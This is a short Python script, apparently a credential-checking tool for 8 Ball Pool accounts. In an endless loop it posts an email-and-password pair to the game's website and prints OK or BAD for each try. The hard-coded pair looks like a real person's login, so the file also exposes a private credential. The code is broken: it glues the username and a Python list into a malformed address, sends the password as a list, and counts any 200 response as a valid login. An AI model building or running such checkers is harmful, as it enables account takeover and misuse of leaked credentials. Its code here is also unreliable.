import random
import requests
from termcolor import colored

domains = ["diegowkr7@gmail.com"]
passwords = ["ogunhe13"]

def generate_email():
    username = ''
    domain = (domains)
    return f"{username}@{domain}"

def generate_password():
    return (passwords)

def check_account(email, password):
    url = "https://8ballpool.com"
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    payload = {
        "email": email,
        "password": password
    }
    
    response = requests.post(url, headers=headers, data=payload)
    if response.status_code == 200:
        return "OK"
    else:
        return "BAD"

def main():
    while True:
        email = generate_email()
        password = generate_password()
        result = check_account(email, password)
        
        if result == "OK":
            print(colored(f"Tool updated by San! Email: {email}, Password: {password} - {result}", "green"))
        else:
            print(colored(f"Tool updated by San! Email: {email}, Password: {password} - {result}", "red"))

if __name__ == "__main__":
    main()
